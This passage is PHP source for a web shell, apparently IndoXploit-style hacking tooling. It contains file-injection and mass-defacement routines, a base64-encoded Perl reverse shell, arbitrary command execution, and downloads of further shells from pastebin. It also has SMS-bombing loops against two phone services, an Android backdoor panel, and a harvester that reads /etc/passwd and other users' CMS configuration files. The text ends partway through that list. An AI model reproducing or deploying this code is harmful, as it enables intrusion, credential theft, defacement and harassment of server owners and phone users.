		echo '<font size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';
	}
	if (!empty($_e04f8301a9f1)) {
		if ($_84c54f971273 = opendir($_3528fced53a2)) {
			echo 'Website: '.$_d394e1453852.'<br><br>';
			echo 'Looking in '.$_3528fced53a2.'<br>';

			while ($_fb803b5db2a0 = readdir($_84c54f971273)) {
				if ($_fb803b5db2a0 != '.' && 
				$_fb803b5db2a0 != '..' && 
				$_fb803b5db2a0 != 'rev.php' && 
				$_fb803b5db2a0 != 'REV.php' && 
				$_fb803b5db2a0 != '.htaccess' && 
				$_fb803b5db2a0 != 'php.ini' && 
				$_fb803b5db2a0 != 'admin' && 
				$_fb803b5db2a0 != 'images' && 
				$_fb803b5db2a0 != 'image' && 
				$_fb803b5db2a0 != 'img' && 
				$_fb803b5db2a0 != 'phpmyadmin' && 
				$_fb803b5db2a0 != 'files' && 
				$_fb803b5db2a0 != '.ftpquota' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'xml' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpg' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'png' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpeg' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'txt' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'exe' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'html' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'shtml' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'htm' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'css' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'zip' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'js' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'py' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'pl' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'md' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'gif' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'tar.gz' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'c' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql.zip' && 
				strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'out') {
					echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$_fb803b5db2a0.'">'.$_fb803b5db2a0.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
					$_c4f3394d1c6c = base64_decode($_9f7af403d39c);
					$_c4f3394d1c6c .= file_get_contents($_fb803b5db2a0);
					file_put_contents($_fb803b5db2a0, $_c4f3394d1c6c); 
					echo '<br><br><br>';
				} //if
			} //while
		}
	}
}

if (isset($_GET['domains'])) {
	if(strtolower(substr(PHP_OS,0,3)) == "win") {
		$_f3d329025a5d = 'win';
	}else {
		$_f3d329025a5d = 'nix';
	}

	if ($_f3d329025a5d == 'win') {
		echo "<center><br><br><font style='color: white; font-size: 200%;'>Ooopppss Windows Server :P<br>You Better Find Linux :P </font></center>";
	}
	else {
		if (isset($_GET['domains'])) {
			$_db30bcba387e = @implode(@file("/etc/named.conf"));
			$_549674eea689 = "/var/named";
			if (!$_db30bcba387e) {
				$_fb0dd6286113 = scandir($_549674eea689);
				$_74ba591cb2f1=1;
				$_cbd11b654fbf = 0; 
				echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2><center>There are : ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.</center></td></tr>
				<tr><td>No</td><td>Domain</td><td>User</td></tr>";

				foreach ($_fb0dd6286113 as &$_abf6e8a6ebfa) { 
					if (stripos($_abf6e8a6ebfa,".db")) { 
						$_abf6e8a6ebfa = str_replace('.db','',$_abf6e8a6ebfa); 
					}
					if (strlen($_abf6e8a6ebfa) > 6) {
						echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>User</td></tr>"; 
					} 
				}

				echo "</table>";
			}
			else{ 
				$_74ba591cb2f1 = 1; 
				preg_match_all("#named/(.*?).db#", $_db30bcba387e, $_6fb5fe1b7448); 
				$_fb0dd6286113 = array_unique($_6fb5fe1b7448[1]); 
				echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2> There are  ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
				<tr><td>No</td><td>Domain</td><td>User</td></tr>"; 
				
				foreach ($_fb0dd6286113 as $_abf6e8a6ebfa) {
					$_1653139bda87 = posix_getpwuid(@fileowner("/etc/valiases/" . $_abf6e8a6ebfa)); 
					echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>".$_1653139bda87['name']."</td></tr>"; 
					echo "</font><br><br><br>";
				}
			}
		}
	} 
}

if (isset($_GET['back_connecter'])) {
	$_0c5e3246e473="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";

	echo "<center><br><br><form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\" method='POST'><span style='font-family: cursive; font-size: 200%; color: white;'>Back-Connecter Via Perl</span><br/><br>Your Ip: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'><br><br> Port to bind: <input type='text' name='port' value='110'><br><br><input type=submit name='backconnect' value='Submit'></form><br>";
	if(isset($_POST['backconnect'])) {
		function cf($_e0887aa7bc0b,$_9c65822c9127) {
			$_dfb1f07e894f = @fopen($_e0887aa7bc0b,"w") or @function_exists('file_put_contents');
			if($_dfb1f07e894f){
				@fwrite($_dfb1f07e894f,@base64_decode($_9c65822c9127));
				@fclose($_dfb1f07e894f);
			}
		}
		function An0n3xPloiTeR($_6d1b263a32f3) {
			$_1765c46dda35 = '';
			if (function_exists('exec')) {
				@exec($_6d1b263a32f3,$_1765c46dda35);
				$_1765c46dda35 = @join("\n",$_1765c46dda35);
			
			} elseif (function_exists('passthru')) {
				ob_start();
				@passthru($_6d1b263a32f3);
				$_1765c46dda35 = ob_get_clean();
			
			} elseif (function_exists('system')) {
				ob_start();
				@system($_6d1b263a32f3);
				$_1765c46dda35 = ob_get_clean();
			
			} elseif (function_exists('shell_exec')) {
				$_1765c46dda35 = shell_exec($_6d1b263a32f3);
			
			} elseif (is_resource($_e0887aa7bc0b = @popen($_6d1b263a32f3,"r"))) {
				$_1765c46dda35 = "";
				while(!@feof($_e0887aa7bc0b))$_1765c46dda35 .= fread($_e0887aa7bc0b,1024);
					pclose($_e0887aa7bc0b);
				}
				return $_1765c46dda35;
			}
						
			if($_POST['backconnect']) {
				cf("/tmp/bc.pl",$_0c5e3246e473);
				$_1765c46dda35 = An0n3xPloiTeR("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); 
				sleep(1);
				echo "<pre class=ml1>$_1765c46dda35\n".An0n3xPloiTeR("ps aux | grep bc.pl")."</pre>"; 
				unlink("/tmp/bc.pl"); //ini meragukan
			}
		}
	}
}

function lib_installed() {
	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	return implode(" | ", $lib);
}
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}

function getfile($name) {
	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
	if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");
	elseif($name === "LRE") $get = array("https://pastebin.com/raw/PVPfA21i", "makman.php");

	$fp = fopen($get[1], "w");
	$ch = curl_init();
	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	   	  curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

function getdomainname() {
	$fopen = fopen("/etc/named.conf", "r");
	while($read = fgets($fopen)) {
		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
		$domain[] = $getdomain[1][0];
	}
	return $domain;
}

function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}
function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = $hdd['size'] - $hdd['free'];
	return (object) $hdd;
}

function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}


function xreadFile($src) {
    $_data = fopen($src, "r") or die("Gagal membuka file!");
    $data = fread($_data, filesize($src));
    fclose($_data);

    return $data;
}

function xwriteFile($src, $data) {
    $_data = fopen($src, "w");
    fwrite($_data, $data);
    fclose($_data);
}

function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    return curl_exec($ch);
		  curl_close($ch);
}

function reverse() {
	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=");
	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
	$explode  = explode(",,", $response);
	unset($explode[0]);

	foreach($explode as $domain) {
		$domain = "http://$domain";
		$domain = str_replace(",", "", $domain);
		$url[] 	= $domain;
		ob_flush();
		flush();
	}

	return $url;
}

function getValue($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start 	= strpos($param, $kata1) + strlen($kata1);
    $end 	= strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

function massdeface($dir, $file, $filename, $type = null) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === "." || $dir_ === "..") {
			file_put_contents($location, $file);
		}
		else {
			if(is_dir($path) AND is_writable($path)) {
				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
				file_put_contents($location, $file);
				if($type === "-alldir") {
					massdeface($path, $file, $filename, "-alldir");
				}
			}
		}
	}
}

function massdelete($dir, $filename) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === '.') {
			if(file_exists("$dir/$filename")) {
				unlink("$dir/$filename");
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname($dir)."/$filename")) {
				unlink(dirname($dir)."/$filename");
			}
		} 
		else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
					unlink($location);
					massdelete($path, $filename);
				}
			}
		}
	}
}

function jdid_smsbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
function telk_smsbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}

function backdoor($os, $args = null) 
{   
        if($os == "android") {
            $path = dirname(__FILE__)."/rat/android/";
            if (!file_exists($path."target.txt") || !file_exists($path."aksi.txt")) {
                  mkdir($path, 0777, true);
                  xwriteFile($path."target.txt", "kosong");
                  xwriteFile($path."aksi.txt", "kosong");
            }
            echo "<font color='green'><h2>Android backdoor selected</h2></font>";
            echo '<form method="POST" action="?backdoor">
                  <input type="submit" value="select target" name="rat-android-target"/>&nbsp&nbsp&nbsp'.xreadFile($path."target.txt").'<br><br>
                  <input type="submit" value="List aksi" name="rat-android-aksiList"/>&nbsp&nbsp&nbsp'.xreadFile($path."aksi.txt").'<br>
                  
                  <textarea cols=30 rows=2 name="rat-android-aksi" style="background:#ffffff;color:#000000"></textarea>
                  <input type="submit" value="Exploit" name="rat-android-exploit"/><br>
                  <input type="submit" value="Save" name="rat-android-save"/>
                  <input type="submit" value="Help" name="rat-android-help"/>
                  <input type="submit" value="Keluar OS" name="rat-android-keluar"/>
                  </form>';
            if (isset($_POST['rat-android-exploit'])) {
                  $aksi = $_POST['rat-android-aksi'];
                  
                  xwriteFile($path."aksi.txt", $aksi);
                  echo("<script>location.href='?backdoor';</script>");
            }
            elseif (isset($_POST['rat-android-aksiList'])) {
                  echo "<font color='yellow'><h2>----- History list -----</h2></font>";
                  echo "<form method='POST'><input type='submit' value='Reset' name='rat-android-history-reset'/></form><br>";
                  $dir = getcwd()."/rat/android/history.txt";
                  $_data = fopen($dir, "r") or die("Gagal membuka file!");
                  $data = fread($_data, filesize($dir));
                  fclose($_data);

                  $out = explode("\n", $data);
                  for ($i=0; $i<count($out); $i++) {
                        echo "<h2>".$out[$i]."</h2>";
                  }
            }
            elseif (isset($_POST['rat-android-save'])) {
                  $path = dirname(__FILE__)."/rat/android/";
                  
                  $file = fopen($path."history.txt", "a");
	          fwrite($file, $_POST['rat-android-aksi']."\n");
	          fclose($file);
                  echo "<script>alert('payload aksi disimpan tekan list untuk melihat');</script>";
            }
            elseif (isset($_POST['rat-android-save'])) {
            }
            elseif (isset($_POST['rat-android-help'])) {
                   echo "zzzzz";
            }
            elseif (isset($_POST['rat-android-keluar'])) {
                   unset($_SESSION['opt-rat']);
                   echo("<script>location.href='?backdoor';</script>");
            }
            elseif(isset($_POST['rat-android-target'])) {
                   echo "<font color='yellow'><h2>Target menu android</h2></font>";
                   $dir = getcwd()."/rat/android/";
                   if (is_dir($dir)) {
                         if ($dh = opendir($dir)) {
                             while($file = readdir($dh)) {
                                  if($file != "." && $file != "..") {
                                       $time = date("d-m-Y H:i:s", fileatime($dir.'/'.$file));
                                       echo "<h4><a href='?rat-android-target=".$file."'>".$file."&nbsp&nbsp&nbsp&nbsp&nbsp".$time."</a></h4>";
                                  }
                             }
                             closedir($dh);
                         }
                   }
             }
             
        }
        else {
            unset($_SESSION['opt-rat']);
            echo "<script>alert('untuk ".$os." belum dibuat');</script>";
        }

}

if (isset($_POST['idx_cmd'])) {
    echo "<pre>"; system($_POST['idx_cmd']); echo "</pre>";
    idx_tools("cmd");
}
function idx_tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='' style='margin-top: 15px;'>
			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='idx_cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
			  </form>";
	}
	elseif($toolsname === "spawn") {
		if($args === "adminer") {
			if(file_exists("adminer.php")) {
				print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
				if(getfile("adminer")) {
					print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
				}
				else {
					print color(1, 1, "Error while downloading file Adminer.");
					@unlink("adminer.php");
				}
			}
		}
		elseif($args === "webconsole") {
			if(file_exists("webconsole.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
				if(getfile("webconsole")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file WebConsole.");
					@unlink("webconsole.php");
				}
			}
		}
		elseif($args === "cgitelnet1") {
			if(file_exists("idx_cgi/cgitelnet1.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet1.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet1")) {
					chmod('idx_cgi/cgitelnet1.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "cgitelnet2") {
			if(file_exists("idx_cgi/cgitelnet2.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet2.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet2")) {
					chmod('idx_cgi/cgitelnet2.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "phpinfo") {
			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
		}
	}
	
	elseif($toolsname === "jumping") {
		$i = 0;
		foreach(getuser() as $user) {
			$path = "/home/$user/public_html";
			if(is_readable($path)) {
				$status = color(1, 2, "[R]");
				if(is_writable($path)) {
					$status = color(1, 2, "[RW]");
				}
				$i++;
				print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
				if(!function_exists('posix_getpwuid')) print "<br>";
				if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
				foreach(getdomainname() as $domain) {
					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
					$userdomain = $userdomain->name;
					if($userdomain === $user) {
						print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
						break;
					}
				}
			}
		}
		print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
	}
	elseif($toolsname === "idxconfig") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
		if(!is_dir(path()."/idx_config/")) {
			@mkdir('idx_config', 0755);
			$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
			save("idx_config/.htaccess","w", $htaccess);

			foreach(getuser() as $user) {
				$user_docroot = "/home/$user/public_html/";
				if(is_readable($user_docroot)) {
					$getconfig = array(
						"/home/$user/.accesshash" => "WHM-accesshash",
						"$user_docroot/config/koneksi.php" => "Lokomedia",
						"$user_docroot/forum/config.php" => "phpBB",
						"$user_docroot/sites/default/settings.php" => "Drupal",
						"$user_docroot/config/settings.inc.php" => "PrestaShop",
						"$user_docroot/app/etc/local.xml" => "Magento",
						"$user_docroot/admin/config.php" => "OpenCart",
						"$user_docroot/application/config/database.php" => "Ellislab",
						"$user_docroot/vb/includes/config.php" => "Vbulletin",
						"$user_docroot/includes/config.php" => "Vbulletin",
						"$user_docroot/forum/includes/config.php" => "Vbulletin",
						"$user_docroot/forums/includes/config.php" => "Vbulletin",
						"$user_docroot/cc/includes/config.php" => "Vbulletin",
						"$user_docroot/inc/config.php" => "MyBB",
						"$user_docroot/includes/configure.php" => "OsCommerce",
						"$user_docroot/shop/includes/configure.php" => "OsCommerce",
						"$user_docroot/os/includes/configure.php" => "OsCommerce",
						"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
						"$user_docroot/products/includes/configure.php" => "OsCommerce",
						"$user_docroot/cart/includes/configure.php" => "OsCommerce",
						"$user_docroot/inc/conf_global.php" => "IPB",
						"$user_docroot/wp-config.php" => "Wordpress",
						"$user_docroot/wp/test/wp-config.php" => "Wordpress",
						"$user_docroot/blog/wp-config.php" => "Wordpress",
						"$user_docroot/beta/wp-config.php" => "Wordpress",
						"$user_docroot/portal/wp-config.php" => "Wordpress",
